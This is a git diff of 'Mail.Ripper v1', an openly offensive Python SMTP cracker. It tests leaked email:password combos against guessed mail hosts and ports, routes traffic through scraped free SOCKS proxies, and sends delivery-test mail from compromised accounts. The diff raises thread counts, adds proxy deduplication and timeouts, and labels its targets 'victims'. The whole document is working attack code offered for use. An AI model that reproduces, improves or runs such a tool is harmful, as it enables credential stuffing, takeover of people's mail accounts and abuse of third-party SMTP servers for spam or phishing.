@@ -2,8 +2,21 @@
 # -*- coding: utf-8 -*-
 # name: Mail.Ripper v1 (proxy version)
 # description: smtp checker / smtp cracker with SOCKS support and e-mail delivery test.
-# version: 1.10, 2020-12-12
+# version: 1.11, 2020-12-19
 # author: DrPython3 @ GitHub.com
+
+'''
+    ### IMPORTANT NOTICE ###
+    This is the last update for Mail.Ripper v1! Every user may add
+    further improvements to the code on purpose. But do not worry!
+    I am already working on:
+
+    MAIL.RIP v2
+
+    Making Mail.Rip faster and stronger now! Expect in JAN 2021.
+    DrPython3
+
+'''
 
 # ----------------------------------------------------------------------------------------------------------------------
 # ((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))
@@ -30,7 +43,7 @@ try:
     from colorama import *
 # in case of any errors, exit:
 except:
-    sys.exit('An error occurred while needed packages where import.\nInstall needed packages and try again afterwards.')
+    sys.exit('An error occurred while needed packages where import.\nInstall needed packages and try again.')
 
 # initiate colorama:
 init()
@@ -70,16 +83,17 @@ combos = []
 socksprox = []
 # default settings:
 sslcontext = ssl.create_default_context()
-tout = float(10.0)
+tout = float(5.0)
 skip = int(1)
 usesocks = int(0)
 sockscount = int(0)
 sockstype = int(4)
-attackthreats = int(25)
+attackthreats = int(30)
 valid = int(0)
 bad = int(0)
 attackermail = str('invalid@mail.com')
-regexp = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
+# improved RegEx for e-mail verification:
+regexp = '^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
 # suggested by Trustdee, dictionaries and lists are in config.json now:
 try:
     with open('config.json') as config:
@@ -97,9 +111,9 @@ except:
     hosterports = {}
     subh = ['', 'mail.', 'webmail.', 'smtp.', 'mail2.', 'mx.', 'email.', 'mail1.', 'owa.', 'mx1.', 'exchange.',
             'smtpauths.', 'smtpauth.', 'smtp.mail.', 'smtp-mail.', 'securesmtp.']
-    subp = [587, 465, 25, 26, 2525]
+    subp = [587, 465, 25, 26, 2525, 2626]
     blacklisted = ['gmail.com', 'googlemail.com', 'yahoo.com', 'yahoo.de', 'yahoo.co.uk', 'hotmail.com',
-                   'protonmail.com', 'yandex.ru']
+                   'yahoo.com.br', 'protonmail.com', 'yandex.ru']
     socksfoursources = []
     socksfivesources = []
 
@@ -123,7 +137,7 @@ def countdown():
     i = 5
     while i > 0:
         print(Fore.RED + '... ' + str(i))
-        sleep(0.9)
+        sleep(0.95)
         i -= 1
     return None
 
@@ -177,7 +191,6 @@ def blackcheck(search):
 
 
 # getproxdata == scrapes SOCKS4 or SOCKS5 proxies from Proxyscrape.com:
-#TODO: include removal of duplicates from scraped proxy-list.
 def getproxdata():
     if sockstype == int(5):
         print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies for you ...\n')
@@ -192,17 +205,49 @@ def getproxdata():
         http = urllib3.PoolManager(ca_certs=certifi.where())
         proxydata = http.request('GET', str(ps))
         # write scraped data to file:
-        with open('proxydata.txt', 'a') as proxyfile:
+        with open('scrapedproxydata.txt', 'a') as proxyfile:
             proxyfile.write(str(proxydata.data.decode('utf-8')))
             proxyfile.close()
     # remove unwanted text from scraping results:
-    with open('proxydata.txt', 'r+') as p:
+    with open('scrapedproxydata.txt', 'r+') as p:
         p_new = p.readlines()
         p.seek(0)
         for line in p_new:
             if '<url' not in line:
                 p.write(line)
         p.truncate()
+    print(Fore.LIGHTYELLOW_EX + '\nRemoving duplicates from proxylist ...')
+    # send scraped proxylist to removedups() function:
+    result = removedups()
+    #if successful, print verbose message and delete scrapedproxydata.txt:
+    if result == True:
+        print(Fore.LIGHTGREEN_EX + '\nProxylist has been cleaned!\n\n')
+        if os.name == 'nt':
+            os.system('del scrapedproxydata.txt')
+        else:
+            os.system('rm scrapedproxydata.txt')
+    else:
+        print(Fore.LIGHTRED_EX + 'Removing duplicates from proxylist failed ...\n\n')
+    return None
+
+
+# removedups == deletes duplicates from scraped proxies:
+def removedups():
+    # temporary cache for proxys already seen:
+    unique_proxys = set()
+    try:
+        # create new proxydata.txt:
+        with open('proxydata.txt', 'w') as cleaned:
+            # read proxys from scrapedproxydata.txt line by line:
+            for line in open('scrapedproxydata.txt', 'r'):
+                # check if the proxy is already in temp cache:
+                if line not in unique_proxys:
+                    # if its a new proxy, write to file proxydata.txt and add to cache:
+                    cleaned.write(line)
+                    unique_proxys.add(line)
+        return True
+    except:
+        return False
 
 
 # randomprox == returns random one from scraped proxies:
@@ -234,6 +279,8 @@ def finder(unkdom):
                     socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
                 elif sockstype == int(5):
                     socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
+                # set proxy default timeout:
+                socks.socket.setdefaulttimeout(tout)
                 # send all smtplib traffic through that proxy:
                 socks.wrapmodule(smtplib)
             else:
@@ -280,6 +327,9 @@ def attacker(attackhost, attackport, attackuser, attackpass):
             socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
         elif sockstype == int(5):
             socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
+        # set proxy default timeout:
+        socks.socket.setdefaulttimeout(tout)
+        # send all smtplib traffic through the proxy:
         socks.wrapmodule(smtplib)
     else:
         pass
@@ -299,11 +349,13 @@ def attacker(attackhost, attackport, attackuser, attackpass):
                     try:
                         attack = smtplib.SMTP(str(attackhost), int(p))
                         attack.quit()
-                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection to ' + str(attackhost) + ' found: ' + str(p))
+                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection to ' + str(attackhost) + ' found: '
+                              + str(p))
                         attackport = int(p)
                         break
                     except:
-                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection to HOST: ' + str(attackhost) + ' failed with PORT: ' + str(p))
+                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection to HOST: ' + str(attackhost) + ' failed with PORT: '
+                              + str(p))
                         try:
                             attack.quit()
                         except:
@@ -354,7 +406,6 @@ def attacker(attackhost, attackport, attackuser, attackpass):
 
 
 # sendcheckmsg == trys to send an e-mail to user address by valid SMTP:
-#TODO: extract template for e-mail content to a separate file and import it here.
 def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
     if attackermail == str('invalid@mail.com'):
         print(Fore.LIGHTRED_EX + Style.BRIGHT + 'E-mail sending skipped for: ' + str(mailuser))
@@ -365,6 +416,9 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
                 socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
             elif sockstype == int(5):
                 socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
+            # set proxy default timeout to 60 seconds for a more reliable SMTP test:
+            socks.socket.setdefaulttimeout(60.0)
+            # set all smtplib traffic through the proxy:
             socks.wrapmodule(smtplib)
         else:
             pass
@@ -392,7 +446,7 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
         mail.add_header('From', mailsender)
         mail.add_header('To', mailreceiver)
         mail.add_header('Reply-To', mailsender)
-        # the following headers should be updated on purpose as well:
+        # the following headers should be updated on purpose as well - to edit on purpose:
         mail.add_header('MIME-Version', '1.0')
         mail.add_header('X-Priority', '1')
         mail.add_header('X-MSmail-Priority', 'High')
@@ -426,6 +480,7 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
             mailer.quit()
         except:
             pass
+    return None
 
 
 # checkmate == the main checker process:
@@ -452,7 +507,8 @@ def checkmate():
                 blackhost = blackcheck(str(l[0].split("@")[1]).lower())
                 # if e-mail domain is on blacklist, combo will not be checked:
                 if blackhost == True:
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':' + str(l[1]))
+                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':'
+                          + str(l[1]))
                     skips(str(l[0]) + ':' + str(l[1]))
                     bad += 1
                     continue
@@ -468,14 +524,16 @@ def checkmate():
                 try:
                     newhost = str(finder(str(l[0].split("@")[1]).lower()))
                     if newhost == str('failed'):
-                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':' + str(l[1]))
+                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':'
+                              + str(l[1]))
                         skips(str(l[0]) + ':' + str(l[1]))
                         bad += 1
                         continue
                     else:
                         targethost = str(newhost)
                 except:
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0]) + ':' + str(l[1]))
+                    print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0]) + ':'
+                          + str(l[1]))
                     skips(str(l[0]) + ':' + str(l[1]))
                     bad += 1
                     continue
@@ -513,8 +571,8 @@ def checkmate():
                 sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str('none'), int(0))
             continue
         except:
-            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ' + str(th) + ':' + str(tp) + ', USER: ' + str(tuser)
-                  + ', PASS: ' + str(tpass))
+            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ' + str(th) + ':' + str(tp) + ', USER: '
+                  + str(tuser) + ', PASS: ' + str(tpass))
             checked(str(tuser) + ':' + str(tpass))
             bad += 1
             continue
@@ -567,20 +625,22 @@ else:
 
 # ask for default timeout:
 try:
-    tout = float(input(Fore.WHITE + 'Enter the value for timeout (any key for default = 10.0):' + Fore.LIGHTYELLOW_EX + '     '))
+    tout = float(input(Fore.WHITE + 'Enter the value for timeout (any key for default = 5.0):' + Fore.LIGHTYELLOW_EX + '     '))
 except:
-    tout = float(10.0)
+    tout = float(5.0)
 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + '.\n')
 
 # ask for amount of threads to use:
 try:
-    attackthreats = int(input(Fore.WHITE + 'Enter the amount of threads to use (any key for default = 25):' + Fore.LIGHTYELLOW_EX + '     '))
+    attackthreats = int(input(Fore.WHITE + 'Enter the amount of threads to use (any key for default = 30):'
+                              + Fore.LIGHTYELLOW_EX + '     '))
 except:
-    attackthreats = int(25)
+    attackthreats = int(30)
 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(attackthreats) + '.\n')
 
 # ask for skipping options:
-skipuser = input(Fore.WHITE + 'Want to skip services like GMAIL, etc. (yes / no, any key for default = yes):' + Fore.LIGHTYELLOW_EX + '     ')
+skipuser = input(Fore.WHITE + 'Want to skip services like GMAIL, etc. (yes / no, any key for default = yes):'
+                 + Fore.LIGHTYELLOW_EX + '     ')
 if skipuser == 'no':
     skip = int(0)
 elif skipuser == 'n':
@@ -588,12 +648,14 @@ elif skipuser == 'n':
 else:
     skip = int(1)
 if skip == 0:
-    print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: Services like GMAIL, etc. will not be skipped! You probably waste time!\n')
+    print(Fore.LIGHTRED_EX + Style.BRIGHT
+          + '\nWARNING: Services like GMAIL, etc. will not be skipped! You probably waste time!\n')
 else:
     print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL, etc. will be skipped and saved to a txt-file.\n')
 
 # ask for proxy support:
-proxyuse = str(input(Fore.WHITE + 'Want to use free SOCKS-proxies (yes / no, any key for default = no):' + Fore.LIGHTYELLOW_EX + '     '))
+proxyuse = str(input(Fore.WHITE + 'Want to use free SOCKS-proxies (yes / no, any key for default = no):' + Fore.LIGHTYELLOW_EX
+                     + '     '))
 if proxyuse == 'yes':
     usesocks = int(1)
 elif proxyuse == 'y':
@@ -606,7 +668,8 @@ else:
     print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFREE SOCKS-proxies not activated.\n')
 if usesocks == int(1):
     try:
-        sockstype = int(input(Fore.WHITE + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5):' + Fore.LIGHTYELLOW_EX + '     '))
+        sockstype = int(input(Fore.WHITE + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5):'
+                              + Fore.LIGHTYELLOW_EX + '     '))
         if sockstype == int(4):
             print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies.\n')
         elif sockstype == int(5):
